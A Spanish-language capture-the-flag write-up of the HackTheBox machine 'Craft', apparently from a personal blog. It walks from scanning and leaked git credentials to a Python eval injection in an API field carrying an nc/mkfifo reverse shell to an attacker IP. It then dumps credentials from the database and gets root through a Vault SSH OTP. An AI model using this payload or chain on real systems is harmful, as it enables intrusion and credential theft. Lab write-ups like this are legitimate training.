---
title: "Craft"
date: 2026-03-05T12:32:11+01:00
draft: false
categories: ["htb", "machines"]
tags: ["medium", "machine", "cpts", "linux"]
ShowToc: true
TocOpen: true
---

# Scan
Empezamos realizando un escaneo con ``rustscan -a 10.129.16.161 --ulimit 5000 -r 1-65535 -- -sVC -oN scan -Pn``
```js
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCscULO5kzW5659eWy5BdBJWCHxBSvqKIn6TZwEdp4NG3cLJc6aVQxEUknoSoMa2RAy2CFv/IWKbFIEY33XM2PRhKTuSJd/aNrMKs0jX40q/0zpmRv4/HzLdWE33t9on739xRWgsnNI0JOaGAwa4ryubOeKo53ykP9fTgLeHvT37GthWJIzfXNA7UFXJen3T4+4xmbxA2Low8D8xAGjqVLoEgKGVy05oL+zGucd0C5LyclT0Gkxm3NCk3MLdFdPOuaVX5jlX32yKUA//Go9fN9OlGffcHkLfgTA7s+PLememC14H/r8ZLYJYByeBj2MqR6ndkQ3+OkmSjeOBPEamkqz
|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJAzk0wAfmy1zhnnnQOEoqLN0OK0zF9VwqqwIRkG58ARwaVlwSARRf3BS7Ywo2AfjZS9EWZycsXxy3/7MwEQS1U=
|   256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJsBTHLrhy1IfI4AeEWxjJBm9z6wm/F9mMPMUbpRt2+K
443/tcp  open  ssl/http syn-ack ttl 62 nginx 1.15.8
|_http-title: About
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.15.8
| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
| Issuer: commonName=Craft CA/organizationName=Craft/stateOrProvinceName=New York/countryName=US/organizationalUnitName=Craft/localityName=Buffalo/emailAddress=admin@craft.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-02-06T02:25:47
| Not valid after:  2020-06-20T02:25:47
| MD5:     0111 76e2 83c8 0f26 50e7 56e4 ce16 4766
| SHA-1:   2e11 62ef 4d2e 366f 196a 51f0 c5ca b8ce 8592 3730
| SHA-256: 8828 6ef6 f2bb 87e6 58a3 f3ba 1ddf 15ef 8e97 4f3d cd81 237a c6c1 e036 3d6b 863e
| -----BEGIN CERTIFICATE-----
| MIIEQDCCAigCCQC6e7PJjcRLnzANBgkqhkiG9w0BAQsFADCBhTELMAkGA1UEBhMC
| VVMxETAPBgNVBAgMCE5ldyBZb3JrMRAwDgYDVQQHDAdCdWZmYWxvMQ4wDAYDVQQK
| DAVDcmFmdDEOMAwGA1UECwwFQ3JhZnQxETAPBgNVBAMMCENyYWZ0IENBMR4wHAYJ
| KoZIhvcNAQkBFg9hZG1pbkBjcmFmdC5odGIwHhcNMTkwMjA2MDIyNTQ3WhcNMjAw
| NjIwMDIyNTQ3WjA+MQswCQYDVQQGEwJVUzELMAkGA1UECAwCTlkxDjAMBgNVBAoM
| BUNyYWZ0MRIwEAYDVQQDDAljcmFmdC5odGIwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQDV6vf1Ki4fZhJeMOQBAUFx98hM70l6Hpu+4MlB4++i/u2fKRvV
| woGYPpz3KGuNKv+BvjR0+yGFM2HflIgZcc5yE//MGnb9F1fcjJ66rT3qBHjIfwls
| 6MRygl9NRVSa09PvrXUbULBr95V624TTPewiEy1yZgMP+ByQzm9Td0jdTQ8HDugq
| kmOmUDX34kDtZc5u7iFBicTXYBpnYVZNEVsUoT6QVZiez07E5L9d0XZ9+iLeVvaB
| XmeimEdbaR2iKKDTmmWaduH/YLUAEP+gS0STM2lKiXL3euL13f9z6i0KjI8Tymby
| Sb6zeznqWCYuJRHfEZnYj+B26jcXU2ZE0GwrAgMBAAEwDQYJKoZIhvcNAQELBQAD
| ggIBACEEpKD0fivZFNx7Q8/q81SNE8TbAQKyfOP98SXU6LAMPOIfAf27tG8C8xGF
| NCmQcggUwpuz2PB+t8vN91oRHdehkpDsVa7ZOKPQm+RQYH7WlMyO65bz5M2zxkbq
| m7Eesaeakdj2XR4ah7TbCeSU7Mu2ePdOLgHme8qI60XjvTrNJ7sB7i5vc5cs7Q9j
| AgOQhQFJddhFsViOcuICei+m8WDg2w4/Kmbu1lSHCCAm4HPA+H8+dZcHN3v3EtqQ
| IRwoph/Jl5h9yxZXDDrFyGMburGjWtIwvrDJmC3m5eDigliUM1OZEWOmDEzBKfUG
| dpNln6Mku8EI2qrVITepg9Szb/7lbd8OJsWo1g4s9BPi2NA/ZGk3z3no6AvGPo6d
| 74uNAzGaIBaPH9v2pyUsKbeNm/TY2GikZuOUVdSt/dXCEQ5I5TVxLBJYB9RmzA2+
| u5qS2hN6KOBNBWvYsvLTsAyq5VTzi6seRUk887S5oMoVzD4AxchcrwmBOKPaeyTS
| sUpN2F4Ea7TRPyQWN1IjVnIjkpRzN5mUwnKyyKovKyQaYE9HPM59PC8uTri59mIv
| Rtz++eBxJu/2FFDhI7AiOctOhzKTa7AN0JmTO1pp4OFY5uDl4yFk3t+1lMKhggMa
| UOpGWGGlST3o/VI2ebJq4nDewBf/LY3ZtJbNIKcXNpQQzB7/
|_-----END CERTIFICATE-----
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
| tls-nextprotoneg: 
|_  http/1.1
| tls-alpn: 
|_  http/1.1
6022/tcp open  ssh      syn-ack ttl 62 Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:cc:bf:f1:a1:8f:72:b0:c0:fb:df:a3:01:dc:a6:fb (RSA)
|_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDU+fEcb0HbuFvUiMce89AuwclFwGQAJ/FSk+X/uPL+08lP9AzNCivAovV8Py3XEGfUhSDQeJ6Xw5aZCIZB7z/40IViSC1S1fe49lmv7TlDSFKEOZIDQIAuDP3giwyrdX0MnM5qrFtqs9lIH0D8MnGVCh3kcjG5Mh+Jb4/fcGkIpLSAyVc2Fm5PFFV0XIay5vv/SffCO1141JHFZj+Sal4t4MmlZiY1RTaAgGLsn1SshS2EYFv91rZqHmmNCk+GNVSU9txRQm3OrB+06QTsOWnYN71p6+hTe/TQjhaE53zM+/xZi7sPIq6l6evvNSMOOt9fgVQkvM2NuVutLiq6od2h
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
En la pagina principal encontramos dos subdominios ``api.craft.htb`` y ``gogs.craft.htb``:
![](images/Craft.png)
Ahora enumeramos subdominios para ver si hay alguno mas y nos sale ``api.craft.htb`` y ``vault.craft.htb``:
```bash
wfuzz -u "https://10.129.16.161" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  -H "Host: FUZZ.craft.htb" --hh 3779
```
![](images/Craft-1.png)
Añadimos ``craft.htb``, ``gog``,``a``y ``api.craft.htb``  al ``/etc/hosts``
Ahora analizamos las paginas:
En https://api.craft.htb/api/ encontramos la api y como se usa:
![](images/Craft-2.png)
En https://gogs.craft.htb/
Encontramos el código fuente de la api:
![](images/Craft-3.png)
Y si nos vamos a los commits encontramos unas credenciales en texto claro:
![](images/Craft-4.png)
Ahora si los usamos en /auth/login obtenemos un token:
![](images/Craft-5.png)
Ahora vemos esto que es una pista de la vulnerabilidad que tenemos que explotar:
![](images/Craft-6.png)
Ahora aquí vemos el código vulnerable ya que se esta usando eval sobre un parámetro que tiene control el usuario con lo que ejecutara cualquier código que introduzca el usuario:
![](images/Craft-7.png)
Ahora basándonos en el script  de test de conexión:
```JS
#Obtener token 
GET 
	https://api.craft.htb/api/auth/login
HEADER 
	accept: application/json  
AUTH 
	dinesh 4aUh0A8PbVJxgd

#Ejecución remota de codigo
POST 
	https://api.craft.htb/api/brew/
HEADER 
	X-Craft-API-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNzcyNzQyNzg1fQ.Gosky_nbb6_bbW_EDnZ94XdsThJiYcvjYorpnHZxIZ8
	Content-Type: application/json
BODY
	{
	  "id": 100,
	  "brewer": "sifgre",
	  "name": "sidewq",
	  "style": "dewde",
	  "abv": "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.174 7777 >/tmp/f')"
	}

```
Ahora tramito las peticiones con insomnia consiguiendo así el token del usuario dinesh:
![](images/Craft-11.png)
![](images/Craft-10.png)
Ahora con el token de dinesh hacemos la inyección del código malicioso de python en **EVAL** en el parámetro **ABV** consiguiendo así ejecución remota de código:
![](images/Craft-9.png)
![](images/Craft-12.png)
Ponemos nuestro listener a la escucha obteniendo así una shell en un docker:
![](images/Craft-13.png)
Enumerando en el docker encontramos las siguientes credenciales:
![](images/Craft-14.png)
```bash
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```
Tambien tenemos este script que es un ejemplo de conexión a la base de datos:
![](images/Craft-15.png)
Ahora nos hacemos estos scripts en`` /tmp`` usando vi:
table.py
```python
import pymysql
conn = pymysql.connect(host='db', user='craft', password='qLGockJ6G2J75O', db='craft')
cursor = conn.cursor()
cursor.execute("SHOW TABLES")
for table in cursor.fetchall():
    print(f"Tabla encontrada: {table[0]}")
conn.close()
```
dump.py
```python
import pymysql, sys
conn = pymysql.connect(host='db', user='craft', password='qLGockJ6G2J75O', db='craft')
cursor = conn.cursor()
cursor.execute(f"SELECT * FROM {sys.argv[1]}")
for row in cursor.fetchall():
    print(row)
conn.close()
```
Ahora usamos table.py para ver el nombre de las tablas y dump.py para ver su contenido:
![](images/Craft-16.png)
Credenciales:
```bash
dinesh:4aUh0A8PbVJxgd
ebachman:llJ77D8QFkLPQB
gilfoyle:ZEU3N8WNM2rh4T
```
Ahora usamos los usuarios para autenticarnos en https://gogs.craft.htb:
Finalmente con el usuario **gilfoyle** encontramos una clave ssh:
![](images/Craft-17.png)![](images/Craft-18.png)
Ahora nos la descargamos le damos permisos con ``chmod 600``  y nos conectamos con  ``ssh gilfoyle@10.129.16.161 -i id_rsa`` y su contraseña ``ZEU3N8WNM2rh4T`` :
![](images/Craft-20.png)
Y aquí obtenemos la user flag. 
# Privesc
Al listar los archivos ocultos encontramos vault-token:
![](images/Craft-21.png)
Revisando otra vez el repositorio vemos este archivo:
![](images/Craft-22.png)
Vemos que al usar el comando ``vault`` nos aparece la ayuda por lo que esta instalado en nuestra maquina:
![](images/Craft-23.png)
En la ayuda de vault ssh nos aparece esto:
![](images/Craft-24.png)
Entonces entre esto y el script de vault de gogs hacemos el siguiente comando:
``vault ssh -mode=otp -role=root_otp root@127.0.0.1``
Cuando nos pida la pas copiamos y pegamos el otp y ya estaríamos en una sesión de ssh como root.
![](images/Craft-25.png)
Y así obtendríamos la flag de root.